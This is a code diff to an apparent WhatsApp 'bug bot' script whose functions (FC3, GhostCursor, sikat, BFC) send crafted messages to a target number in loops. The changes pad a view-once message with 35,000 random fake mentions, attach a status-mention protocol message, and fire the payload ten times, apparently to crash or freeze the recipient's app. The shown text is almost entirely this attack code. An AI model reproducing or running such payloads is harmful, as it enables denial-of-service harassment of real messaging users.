@@ -1193,7 +1193,14 @@ async function FC2(sock, target) {
   });
 }
 
-async function FC3(sock, target) {
+async function FC3(sock, target, mention) {
+  const mentionedList = [
+        "696969696969@s.whatsapp.net",
+        ...Array.from({ length: 35000 }, () =>
+            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+        )
+    ];
+    
   const msg = await generateWAMessageFromContent(target, {
     viewOnceMessage: {
       message: {
@@ -1247,8 +1254,8 @@ async function FC3(sock, target) {
               versao: "@latest", 
               atualizado: "2025-06-07",  
               suporte: "https://wa.me/status?video", 
-              comandosDisponiveis: ["-"], 
-              prefixo: ".", 
+              comandosDisponiveis: [command], 
+              prefixo: prefix, 
               linguagem: "USA" 
                             })
                         }
@@ -1260,6 +1267,7 @@ async function FC3(sock, target) {
           contextInfo: {
             participant: target,
             stanzaId: "ABCDEF1234567890",
+            mentionedJid: mentionedList,
             quotedMessage: {
               viewOnceMessage: {
                 message: {
@@ -1307,7 +1315,21 @@ async function FC3(sock, target) {
       }
     ]
   });
+
+          if (mention) {
+            await sock.relayMessage(target, {
+                statusMentionMessage: {
+                    message: { protocolMessage: { key: msg.key, type: 25 } }
+                }
+            }, {
+                additionalNodes: [
+                    { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
+                ]
+            });
+        }
+
 }
+
 
 
 async function GhostCursor(sock, target) {
@@ -1498,7 +1520,7 @@ async function sikat(sock, target) {
     for (let i = 0; i < 10; i++) {
         //await AB1(sock, target, true)
         //await AB2(sock, target, true)
-        await GhostCursor(sock, target)
+        await FC3(sock, target, true)
         console.log(`${i} sikat Packet To ${target}`)
     }
 }
@@ -1508,7 +1530,7 @@ async function BFC(sock, target) {
         //await AB2(sock, target, true)
         //await FC2(sock, target)
         //await FC3(sock, target)
-          await GhostCursor(sock, target)
+        await GhostCursor(sock, target)
         console.log(`${i} FC Packet To ${target}`)
     }
 
